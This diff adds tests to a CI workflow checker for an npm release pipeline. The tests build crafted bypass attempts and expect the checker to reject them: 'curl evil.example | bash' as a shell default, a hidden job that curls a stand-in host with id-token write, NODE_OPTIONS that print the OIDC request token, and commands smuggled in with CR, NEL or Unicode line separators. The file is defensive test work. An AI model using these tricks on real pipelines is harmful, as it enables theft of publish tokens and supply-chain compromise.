@@ -198,6 +198,88 @@ describe('check-workflows gate', () => {
     });
   });
 
+  // Crafted bypasses, set 2 (R1 to R29 and S1 to S4).
+  describe('crafted bypasses (set 2)', () => {
+    const base = () => real('release-npm.yml');
+    const ci = () => real('ci.yml');
+    const PUB = '      - run: npm publish pkg/mercurifi-sdk-*.tgz --provenance --access public --ignore-scripts\n';
+    const G = "    if: github.repository_owner == 'mercuri-finance' && github.actor == 'mercurifinance' && github.triggering_actor == 'mercurifinance'\n";
+    const TOP = 'permissions:\n  contents: read\n\njobs';
+    const LAST = '          echo "$RUNNER_TEMP/ci/bin" >> "$GITHUB_PATH"\n';
+    const swap = (text: string, a: string, b: string) => {
+      expect(text.includes(a)).toBe(true);
+      return text.replace(a, b);
+    };
+    const hidden = (br: string) => {
+      const job = ['', '  steal:', '    name: s', '    needs: build', '    runs-on: ubuntu-latest', '    environment: npm-release', '    permissions:', '      id-token: write', '    steps:', '      - run: curl -s evil.example'].join(br);
+      return swap(base(), LAST, `${LAST.trimEnd()}${job}\n`);
+    };
+    const BYTES = /only printable ASCII, spaces and \\n are allowed/;
+    const cases: [string, 'release-npm.yml' | 'ci.yml', () => string, RegExp][] = [
+      ['R1 a comment after the publish line', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()} # ; curl evil\n`), /npm publish <tarball>\.tgz/],
+      ['R2 a comment between continuation lines', 'release-npm.yml', () => swap(base(), PUB, `${PUB}          # hi\n          ; curl evil\n`), /continued on deeper-indented lines/],
+      ['R3 CRLF line endings', 'release-npm.yml', () => base().replace(/\n/g, '\r\n'), /CRLF line endings are not allowed/],
+      ['R4 a lone CR in the publish run', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()}\r          ; curl evil\n`), /U\+000D/],
+      ['R5 a lone CR in the guard', 'release-npm.yml', () => swap(base(), G, `${G.trimEnd()}\r      || true\n`), /U\+000D/],
+      ['R6 a lone CR hiding id-token in CI', 'ci.yml', () => swap(ci(), '  python:\n    name: Python\n', '  python:\n    name: Python\r    permissions:\r      id-token: write\n'), /U\+000D/],
+      ['R7 a lone CR hiding contents: write in CI', 'ci.yml', () => swap(ci(), '  python:\n    name: Python\n', '  python:\n    name: Python\r    permissions:\r      contents: write\n'), /U\+000D/],
+      ['R8 a zero-width space in a key', 'release-npm.yml', () => swap(base(), '    steps:\n      - uses: actions/download', '    steps\u200b:\n      - uses: actions/download'), /U\+200B/],
+      ['R9 a trailing NBSP on the publish line', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()}\u00a0\n`), /U\+00A0/],
+      ['R10 a top-level env (NODE_OPTIONS)', 'release-npm.yml', () => swap(base(), TOP, `env:\n  NODE_OPTIONS: --import=data:text/javascript,console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)\n\n${TOP}`), /top-level env is not allowed/],
+      ['R11 top-level defaults (shell)', 'release-npm.yml', () => swap(base(), TOP, `defaults:\n  run:\n    shell: curl -s evil.example | bash; bash -e {0}\n\n${TOP}`), /top-level defaults is not allowed/],
+      ['R12 a publish job env', 'release-npm.yml', () => swap(base(), '    environment: npm-release\n', '    environment: npm-release\n    env:\n      BASH_ENV: x\n'), /env is not allowed in a publish job/],
+      ['R13 publish job defaults', 'release-npm.yml', () => swap(base(), '    environment: npm-release\n', "    environment: npm-release\n    defaults:\n      run:\n        shell: bash -c 'curl x; bash {0}'\n"), /defaults is not allowed in a publish job/],
+      ['R14 a step working-directory', 'release-npm.yml', () => swap(base(), PUB, PUB.replace('      - run:', '      - working-directory: /tmp\n        run:')), /step key working-directory/],
+      ['R15 continue-on-error', 'release-npm.yml', () => swap(base(), PUB, `${PUB}        continue-on-error: true\n`), /step key continue-on-error/],
+      ['R16 always() in the guard', 'release-npm.yml', () => swap(base(), G, G.replace('if: ', 'if: always() && ')), /if: must be exactly/],
+      ['R17 the guard wrapped in an expression', 'release-npm.yml', () => swap(base(), G, `    if: \${{ ${G.trim().slice(4)} }}\n`), /if: must be exactly/],
+      ['R18 a self-hosted runner', 'release-npm.yml', () => swap(base(), '    runs-on: ubuntu-latest\n    timeout-minutes: 15', '    runs-on: self-hosted\n    timeout-minutes: 15'), /runs on ubuntu-latest/],
+      ['R19 an absolute download path', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: /home/runner\n'), /download path must be relative/],
+      ['R21 an absolute tarball path', 'release-npm.yml', () => swap(base(), PUB, '      - run: npm publish /tmp/x.tgz --provenance --access public --ignore-scripts\n'), /npm publish <tarball>\.tgz/],
+      ['R25 a U+2028 in the publish run', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()}\u2028          ; curl evil\n`), /U\+2028/],
+      ['R26 a top-level env (npm config)', 'release-npm.yml', () => swap(base(), TOP, `env:\n  npm_config_ignore_scripts: 'false'\n  npm_config_provenance: 'false'\n\n${TOP}`), /top-level env is not allowed/],
+      ['R29 a job key differing only by case', 'ci.yml', () => swap(ci(), '  python:\n    name: Python\n', '  python:\n    name: Python\n    Permissions:\n      id-token: write\n'), /Permissions differs from the key permissions only by case/],
+      ['S1 a CR hiding a job in a run block', 'release-npm.yml', () => hidden('\r'), /U\+000D/],
+      ['S2 a NEL hiding a job in a run block', 'release-npm.yml', () => hidden('\x85'), /U\+0085/],
+      ['S3 a U+2028 hiding a job in a run block', 'release-npm.yml', () => hidden('\u2028'), /U\+2028/],
+      ['S4 a NEL hiding a publish job env', 'release-npm.yml', () => swap(base(), '    timeout-minutes: 15\n', '    timeout-minutes: 15\x85    env:\x85      NODE_OPTIONS: --import=data:text/javascript,1\n'), /U\+0085/],
+      // Near variants of the byte rule and the new publish-job rules.
+      ['a U+2029', 'ci.yml', () => swap(ci(), '      - run: npm test\n', '      - run: npm test\u2029      - run: curl evil\n'), /U\+2029/],
+      ['a BOM', 'ci.yml', () => `\ufeff${ci()}`, /U\+FEFF/],
+      ['a tab', 'ci.yml', () => swap(ci(), '      - run: npm test\n', '      - run: npm test\t\n'), /U\+0009/],
+      ['a top-level key outside the allowlist', 'ci.yml', () => swap(ci(), '\njobs:\n', '\nx-extra: 1\n\njobs:\n'), /top-level x-extra is not allowed/],
+      ['a top-level key differing only by case', 'release-npm.yml', () => swap(base(), TOP, `Env:\n  X: y\n\n${TOP}`), /Env differs from the key env only by case/],
+      ['success() in the guard', 'release-npm.yml', () => swap(base(), G, G.replace("'mercurifinance'\n", "'mercurifinance' && success()\n")), /if: must be exactly/],
+      ['a fourth guard clause', 'release-npm.yml', () => swap(base(), G, G.replace("'mercurifinance'\n", "'mercurifinance' && github.ref == 'refs/heads/main'\n")), /if: must be exactly/],
+      ['a runs-on list', 'release-npm.yml', () => swap(base(), '    runs-on: ubuntu-latest\n    timeout-minutes: 15', '    runs-on: [self-hosted, ubuntu-latest]\n    timeout-minutes: 15'), /runs on ubuntu-latest/],
+      ['a download path with ..', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: pkg/../..\n'), /download path must be relative/],
+      ['a download path under ~', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: ~/x\n'), /download path must be relative/],
+      ['a download path from an expression', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: ${{ runner.temp }}\n'), /download path must be relative/],
+    ];
+    it.each(cases)('refuses %s', (_, file, make, why) => {
+      const r = run({ [file]: make() });
+      expect(r.code).toBe(1);
+      expect(r.err).toMatch(why);
+    });
+    it('names CRLF instead of crashing, for every workflow file it reads', () => {
+      const r = run({ 'ci.yml': ci(), 'release-npm.yml': base().replace(/\n/g, '\r\n'), 'release-pypi.yml': real('release-pypi.yml').replace('name: release-pypi\n', 'name: release-pypi\r# x\n') });
+      expect(r.code).toBe(1);
+      expect(r.err).toMatch(/release-npm\.yml: CRLF line endings are not allowed/);
+      expect(r.err).toMatch(/release-pypi\.yml:1:\d+: .*U\+000D/);
+      expect(r.err).not.toMatch(/TypeError/);
+    });
+    // Equivalent spellings the gate reads the same way GitHub does; accepted (they change nothing the job does).
+    it.each([
+      ['R22 a quoted steps key', () => swap(base(), '    steps:\n      - uses: actions/download', '    "steps":\n      - uses: actions/download')],
+      ['R24 needs as a flow list', () => swap(base(), '    needs: build\n', '    needs: [build]\n')],
+      ['R27 a concurrency block', () => swap(base(), '    environment: npm-release\n', '    environment: npm-release\n    concurrency:\n      group: x\n')],
+      ['R28 a space before the run colon', () => swap(base(), PUB, PUB.replace('- run:', '- run :'))],
+      ['the guard clauses in another order', () => swap(base(), G, "    if: github.triggering_actor == 'mercurifinance' && github.repository_owner == 'mercuri-finance' && github.actor == 'mercurifinance'\n")],
+    ])('accepts %s', (_, make) => {
+      expect(run({ 'release-npm.yml': make() }).code).toBe(0);
+    });
+  });
+
   it('runs the TypeScript suite on the .nvmrc Node version and on 24', () => {
     const nvmrc = readFileSync(new URL('../../../.nvmrc', import.meta.url), 'utf8').trim();
     const matrix = /node: \[([^\]]*)\]/.exec(real('ci.yml'))?.[1]?.split(',').map((v) => v.trim().replace(/'/g, ''));
